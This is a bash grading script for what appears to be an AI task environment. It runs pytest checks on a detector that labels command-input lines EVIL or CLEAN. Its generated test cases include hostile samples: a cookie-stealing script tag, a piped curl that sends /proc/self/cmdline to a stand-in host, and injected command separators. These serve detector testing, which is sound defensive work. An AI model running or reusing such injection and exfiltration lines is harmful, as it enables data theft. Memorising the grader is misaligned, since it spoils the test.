#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import secrets
import shutil
import subprocess
import tempfile
import pytest

DETECTOR_SCRIPT = "/home/user/detector.py"
EVIL_CORPUS_DIR = "/app/corpus/evil/"
CLEAN_CORPUS_DIR = "/app/corpus/clean/"

def test_detector_exists():
    assert os.path.isfile(DETECTOR_SCRIPT), f"Detector script not found at {DETECTOR_SCRIPT}"

def run_detector(filepath):
    result = subprocess.run(
        ["python3", DETECTOR_SCRIPT, filepath],
        capture_output=True,
        text=True,
        timeout=15
    )
    return result.stdout.strip().splitlines()

def test_detector_evil_corpus():
    evil_files = [os.path.join(EVIL_CORPUS_DIR, f) for f in os.listdir(EVIL_CORPUS_DIR) if os.path.isfile(os.path.join(EVIL_CORPUS_DIR, f))]
    assert evil_files, f"No files found in evil corpus directory {EVIL_CORPUS_DIR}"

    total_lines = 0
    bypassed_lines = 0
    failed_files = []

    for filepath in evil_files:
        with open(filepath, 'r') as f:
            file_lines = f.read().splitlines()

        if not file_lines:
            continue

        total_lines += len(file_lines)
        outputs = run_detector(filepath)

        if len(outputs) != len(file_lines):
            bypassed_lines += len(file_lines)
            failed_files.append(f"{os.path.basename(filepath)} (output count mismatch)")
            continue

        for i, out in enumerate(outputs):
            if out.strip() != "EVIL":
                bypassed_lines += 1
                if filepath not in failed_files:
                    failed_files.append(os.path.basename(filepath))

    assert bypassed_lines == 0, f"{bypassed_lines} of {total_lines} evil lines bypassed detection. Offending files: {', '.join(set(failed_files))}"

def test_detector_clean_corpus():
    clean_files = [os.path.join(CLEAN_CORPUS_DIR, f) for f in os.listdir(CLEAN_CORPUS_DIR) if os.path.isfile(os.path.join(CLEAN_CORPUS_DIR, f))]
    assert clean_files, f"No files found in clean corpus directory {CLEAN_CORPUS_DIR}"

    total_lines = 0
    modified_lines = 0
    failed_files = []

    for filepath in clean_files:
        with open(filepath, 'r') as f:
            file_lines = f.read().splitlines()

        if not file_lines:
            continue

        total_lines += len(file_lines)
        outputs = run_detector(filepath)

        if len(outputs) != len(file_lines):
            modified_lines += len(file_lines)
            failed_files.append(f"{os.path.basename(filepath)} (output count mismatch)")
            continue

        for i, out in enumerate(outputs):
            if out.strip() != "CLEAN":
                modified_lines += 1
                if filepath not in failed_files:
                    failed_files.append(os.path.basename(filepath))

    assert modified_lines == 0, f"{modified_lines} of {total_lines} clean lines misclassified. Offending files: {', '.join(set(failed_files))}"

def test_detector_generated_mixed_inputs():
    token = secrets.token_hex(12)
    malicious = [
        f"request {token} execute router restart ; <script>alert(document.cookie)</script>",
        f"telemetry {token} | curl -d @/proc/self/cmdline https://collector.invalid/",
        f"voice request {token} ; printf compromised",
        f"input {token} <script>alert(document.cookie)</script>",
    ]
    benign = [
        f"execute router restart {token}",
        f"show interfaces {token}",
        f"display routing table {token}",
        f"check router health {token}",
    ]

    first = [(malicious[i], "EVIL") if i % 2 == 0 else (benign[i], "CLEAN") for i in range(4)]
    second = [(benign[i], "CLEAN") if i % 2 == 0 else (malicious[i], "EVIL") for i in range(4)]

    workdir = tempfile.mkdtemp(prefix="rlv_" + secrets.token_hex(8) + "_")
    try:
        for index, cases in enumerate((first, second)):
            filepath = os.path.join(workdir, secrets.token_hex(16) + f"_{index}.txt")
            with open(filepath, "w", encoding="utf-8") as f:
                f.write("\n".join(line for line, _ in cases) + "\n")

            outputs = run_detector(filepath)
            expected = [label for _, label in cases]
            assert len(outputs) == len(expected), f"Generated input output count mismatch: expected {len(expected)}, got {len(outputs)}"
            assert [out.strip() for out in outputs] == expected, f"Generated mixed input misclassified: expected {expected}, got {outputs}"
    finally:
        shutil.rmtree(workdir, ignore_errors=True)
TEST_EOF

if python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
